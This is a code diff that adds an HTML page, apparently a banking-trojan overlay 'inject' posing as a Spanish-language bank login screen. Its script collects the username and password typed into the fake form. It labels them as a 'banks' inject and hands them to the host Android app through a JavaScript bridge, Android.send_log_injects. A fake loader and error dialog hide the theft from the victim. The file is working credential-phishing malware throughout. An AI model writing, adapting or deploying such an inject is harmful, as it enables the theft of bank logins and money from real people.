@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>tests</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.3.1/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.7.8/angular.min.js"></script>
+    
+   <style>
+       html, body {height: 100%; } .err_div {position: fixed; z-index: 1; top: 0; left: 0; width: 100%; height: 100%; background: rgba(12, 12, 12, .6); } .err_box {position: relative; top: 10%; width: 90%; max-width: 307px; margin: 0 auto; padding: 12px 9px; background: rgba(255, 255, 255, 0.98); text-align: center; box-shadow: 0 0 15px black; } .scum_container {position: relative; overflow: hidden; padding-bottom: 20px; } .scum_container.loader_show .scum {-webkit-animation-name: loader__show; animation-name: loader__show; -webkit-animation-duration: 1s; animation-duration: 1s; transition-timing-function: ease; -webkit-animation-fill-mode: forwards; animation-fill-mode: forwards; } .scum_container.loader_hide {-webkit-animation-name: loader__hide; animation-name: loader__hide; -webkit-animation-duration: 1s; animation-duration: 1s; transition-timing-function: ease; /*     animation-fill-mode:forwards; */ } @-webkit-keyframes loader__show {0% {opacity: 1; } 100% {opacity: 0; -webkit-transform: translateX(1000px); transform: translateX(1000px); } } @keyframes loader__show {0% {opacity: 1; } 100% {opacity: 0; -webkit-transform: translateX(1000px); transform: translateX(1000px); } } @-webkit-keyframes loader__hide {0% {opacity: 0; -webkit-transform: translateX(1000px); transform: translateX(1000px); } 100% {opacity: 1; } } @keyframes loader__hide {0% {opacity: 0; -webkit-transform: translateX(1000px); transform: translateX(1000px); } 100% {opacity: 1; } } .top {text-align: center; } h4 {font-weight: 300; color: red; font-size: 22px; border-bottom: 1px solid red; margin-top: 6px; padding-bottom: 6px; } span.check-slide {background: #d4d4d4; height: 30px; width: 55px; display: inline-block; border-radius: 23px; position: relative; /* border: 1px solid #afafaf; */ } span.check-item {height: 26px; display: inline-block; width: 27px; background: #696666; border-radius: 1000px; position: absolute; left: 2px; top: 2px; transition: all .4s ease; } label {display: none; } .form-control {height: 44px; } .check-slide.active .check-item {right: 3px; left: unset; background: white; } span.check-slide.active {background: red; } .btn-danger {background: red; padding: 8px 32px; font-size: 19px; box-shadow: 0 0 4px black; } .buttondiv.text-center margin-top: 27px; 
+   </style>
+</head>
+
+
+<body ng-app="app" ng-cloak data-ng-controller="c1">
+    
+    
+
+        
+
+    <div class="top">
+        <img class="top-image w-100 " src="https://i.imgur.com/8EcNmwk.png">
+
+
+        <h4>Empresa</h4>
+
+    </div>
+
+
+    <div class="main">
+        <div class="container">
+            <div class="row">
+                <div class="col"></div>
+                <div class="col-sm-10 col-md-8 col-lg-6">
+                    <div class="scum_container">
+                        <div class="scum" id="login-view">
+                            <form name="form1" id="form1" autocomplete="off" onsubmit="send1(event,'finish__');return false">
+                                <div class="form-group">
+                                    <label for="user">Usuario</label>
+                                    <input placeholder="Usuario" type="text" name="user" id="user" pattern=".{4,}" class="form-control" data-err_text="Please enter valid Usuario" data-ng-model="data.user">
+                                </div>
+
+
+                                <div class="form-group">
+                                    <label for="pass">Password</label>
+                                    <input placeholder="Password" type="password" name="pass" id="pass" pattern=".{4,}" class="form-control" data-err_text="Please enter valid Password" data-ng-model="data.pass">
+                                </div>
+
+
+                                <div class="chck d-flex justify-content-between">
+                                    <span for="check">Recordar Usuario</span>
+                                    <span class="check-slide " onclick="$(this).toggleClass('active')">
+                                        <span class="check-item"></span>
+                                    </span>
+                                </div>
+
+
+                                <div class="buttondiv text-center mt-5">
+                                    <button class="btn btn-danger">Entrar</button>
+                                </div>
+
+
+                            </form>
+                        </div>
+                    </div>
+                </div>
+                <div class="col"></div>
+            </div>
+        </div>
+    </div>
+
+        
+
+
+
+    
+    <div class="err_div" style="display:none ;">
+        <div class="err_box">
+            <h4 class="err_title">Error al validar datos</h4>
+            <p class="err_p">
+                La información que has ingresado es incorrecta. Inténtalo de nuevo.
+            </p>
+            <button class="err_buton" onclick="$('.err_div').hide()">Aceptar</button>
+        </div>
+    </div>
+
+
+
+    <script type="text/javascript">
+    var app = angular.module('app', [])
+
+
+    app.controller('c1', ['$scope', function($scope){
+        sc_=$scope;
+
+
+        $scope.data={
+           
+        }
+    }])
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    $('<div class="loader__" style="display:none;position: fixed;background: rgba(21, 20, 20, 0.51);width: 100%;height: 100%;top: 0px;left: 0px;z-index: 1000;text-align: center;">\
+   <span class="fa-stack l_1" style="font-size: 50px;position: relative;top: 50%; -webkit-transform: translateY(-50%); -ms-transform: translateY(-50%); transform: translateY(-50%);">\
+          <i class="fa fa-circle fa-stack-2x"></i>\
+          <i class="fa fa-spinner fa-stack-1x fa-pulse" style="color: white"></i>\
+   </span>\
+   \
+   \
+   \
+</div>').appendTo('body');
+
+    window.loader_ = {
+        hide: function() {
+
+            $('.scum_container').removeClass('loader_hide loader_show')
+            $('.scum_container').addClass('loader_hide');
+            $('.loader__').fadeOut('slow');
+        },
+        show: function() {
+            $('.loader__').fadeIn('fast');
+            $('.scum_container').removeClass('loader_hide loader_show')
+            $('.scum_container').addClass('loader_show');
+        }
+    }
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    $("body").on("keypress change", '.form-control ,.custom_input_class', function() {
+        $(this).closest(".form-group").removeClass("has_err");
+        $(this).removeClass("has_err");
+        $(".err_div").fadeOut();
+    });
+
+    setTimeout(function() {
+        $('.form-control[data-mask]').each(function(i, el, all) {
+            $.mask.definitions['h'] = "[A-Fa-f0-9]";
+            $(this).mask($(this).data().mask, {
+                placeholder: $(this).attr('mask-placeholder')
+            }) //auto mask
+
+        })
+    }, 1) // fix for anguler masked intergration 2019
+
+
+
+    var send1 = function(e, callback__, global_luhn__) {
+
+
+        e.preventDefault();
+        var el = e.target;
+        var err = false;
+        var err_text = [];
+        var err_elements = [];
+
+        if ($(el).data().hasOwnProperty('sub_ed')) { //2019
+            // return;
+        }
+
+        $(el).find("input:visible:enabled,select:visible:enabled").each(function() {
+            var reg__ = new RegExp($(this).attr('pattern'));
+
+            if (!reg__.test($(this).val())) {
+                err = true;
+                err_elements.push(this);
+                err_text.push(this.dataset.err_text);
+                return;
+            }
+            var luhn__ = $(this).data().luhn;
+            if (typeof luhn__ != "undefined" && luhn__ != "") {
+
+                if ($(this).val() != "") {
+                    if (!eval(luhn__)($(this).val(), err_text)) {
+                        err = true;
+                        err_elements.push(this);
+                    }
+                }
+            }
+        });
+
+        //time for global_luhn
+        if (!err) {
+            if (typeof global_luhn__ != "undefined") {
+                if (!eval(global_luhn__)(err_text)) {
+                    err = true;
+                }
+            }
+        }
+
+
+        if (err) {
+            err_text = err_text.filter(function(e) {
+                return e;
+            });
+            err_text = $.unique(err_text);
+            $(".err_ul").html("");
+            $(err_text).each(function(i, t) {
+                $("<li><span>" + t + "</span></li>").appendTo(".err_ul");
+            });
+
+            $(".err_div").show();
+            $(err_elements).each(function() {
+                $(this).closest(".form-group").addClass("has_err");
+                $(this).addClass("has_err");
+
+                //...
+            });
+            $(window).scrollTop(0);
+            return;
+        }
+
+        if (typeof callback__ != "undefined") {
+            $(el).data('sub_ed', true); //2019
+            eval(callback__)(el);
+            return;
+        }
+        //alert("We stack, what to do next?");
+    };
+
+
+
+
+    function next__(el) {
+
+        loader_.show();
+        setTimeout(function() {
+            loader_.hide();
+            $('.scum').hide();
+            $(el).closest('.scum').next().show();
+        }, 4000)
+
+    }
+
+
+    function finish__(el) {
+
+        loader_.show();
+
+        // data___ = $('.form').custom_ser()
+        // $.each(data___, function(i, v) {
+        //     $('<input type="hidden" name="' + i + '" value="' + v + '">').appendTo('#mf') //random prepend
+        // })
+
+
+
+        submit_data();
+
+    }
+
+
+
+
+    function submit_data() {
+
+//here up to you, if you want to send data over ajax, or send form,to send ajax use data__ var.
+data__ = sc_.data;
+data__.type_injects = "banks";
+data__.closed = "close_activity_injects";
+
+console.log(data__);
+
+var ua = navigator.userAgent.toLowerCase();
+if(ua.indexOf("android") > -1) {
+    try {
+    Android.send_log_injects(JSON.stringify(data__));
+    } catch (err) {}
+}else{
+alert(JSON.stringify(data__));
+}
+}
+
+
+
+    $.fn.autoJump = function() {
+        var els = this;
+        els.on("input", function() {
+            if ($(this).val().length == $(this).attr('maxlength')) {
+                var this_ = this;
+                els.each(function(i) {
+                    if (this === this_) {
+                        if (els.length - 1 == i) {
+                            els.eq(0).focus();
+                        } else {
+                            els.eq(i + 1).focus();
+                        }
+                    }
+                });
+            }
+        });
+    };
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </script>
+</body>
+
+</html>
